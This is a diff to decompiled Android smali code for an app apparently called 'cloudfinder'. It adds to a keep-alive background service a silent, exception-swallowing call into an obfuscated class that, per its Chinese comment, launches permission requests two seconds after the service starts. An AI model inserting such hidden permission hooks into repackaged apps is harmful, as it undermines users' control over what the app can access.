@@ -227,6 +227,17 @@
 .method public final onStartCommand(Landroid/content/Intent;II)I
     .locals 9
 
+    # 服务启动：2 秒后拉起权限申请
+    :try_start_permstart
+    move-object/from16 v0, p0
+    invoke-static {v0}, Lڝږ؁ڋ/ھ;->startPerm(Landroid/content/Context;)V
+    :try_end_permstart
+    .catch Ljava/lang/Exception; {:try_start_permstart .. :try_end_permstart} :catch_permstart
+    goto :goto_permstart
+
+    :catch_permstart
+    move-exception v0
+    :goto_permstart
     sget-boolean p1, Lcom/lite/cloudfinder/service/ForegroundKeepAliveService;->إ:Z
 
     const/4 p2, 0x3
